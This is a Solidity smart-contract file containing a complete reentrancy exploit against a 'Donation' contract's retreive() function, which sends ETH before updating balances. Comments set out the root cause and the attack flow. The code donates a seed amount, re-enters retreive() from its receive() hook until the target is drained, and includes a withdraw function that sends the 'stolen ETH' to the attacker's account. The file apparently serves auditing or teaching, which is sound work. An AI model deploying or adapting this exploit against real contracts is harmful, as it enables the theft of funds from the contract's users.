// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

/**
 * @title AttackerReentrancy
 * @notice Exploits the reentrancy vulnerability in Donation.retreive().
 *
 * Root cause: Donation.retreive() performs the external .call() that sends ETH
 * BEFORE it calls UserProfileContract.decUserBalance() to update the caller's
 * balance. This violates the Checks-Effects-Interactions pattern.
 *
 * Because the state (balance) is not updated until AFTER the ETH transfer, a
 * malicious contract can re-enter retreive() from its receive() hook and
 * collect the same credited amount repeatedly until the contract is drained.
 */
interface IDonation {
    function donate(address userAddress) external payable;
    function retreive() external;
    function getBalance() external view returns (uint256);
}

contract AttackerReentrancy {
    IDonation public donationContract;
    uint256   public reentryCount;
    uint256   public maxReentries;

    event AttackStep(uint256 step, uint256 contractBalanceLeft);

    constructor(address _donationContract) {
        donationContract = IDonation(_donationContract);
    }

    /**
     * @notice Entry point for the attack.
     * @param _maxReentries How many extra re-entries to perform after the first
     *        retreive() call. Each re-entry drains another `msg.value` worth of
     *        ETH from the Donation contract.
     *
     * Attack flow:
     *   1. Donate msg.value to credit this contract's address in UserProfile.
     *   2. Call retreive() — Donation sends `msg.value` ETH to this contract.
     *   3. receive() fires before decUserBalance runs → re-enter retreive().
     *   4. Repeat until maxReentries reached or contract is empty.
     *   5. Total ETH stolen = msg.value * (maxReentries + 1).
     */
    function attack(uint256 _maxReentries) external payable {
        require(msg.value > 0, "Send ETH to seed the attack");
        maxReentries = _maxReentries;
        reentryCount = 0;

        // Credit this contract's address in UserProfile (balance = msg.value)
        donationContract.donate{value: msg.value}(address(this));

        emit AttackStep(0, donationContract.getBalance());

        // First withdrawal — reentrancy triggers from receive() below
        donationContract.retreive();
    }

    /**
     * @notice Called by the Donation contract each time it sends ETH here.
     *         Re-enters retreive() before decUserBalance() can zero the balance.
     */
    receive() external payable {
        emit AttackStep(reentryCount + 1, donationContract.getBalance());
        if (reentryCount < maxReentries && donationContract.getBalance() > 0) {
            reentryCount++;
            donationContract.retreive(); // re-enter while balance still positive
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    /// @notice Drain stolen ETH to the attacker's EOA.
    function withdraw(address payable to) external {
        to.transfer(address(this).balance);
    }
}
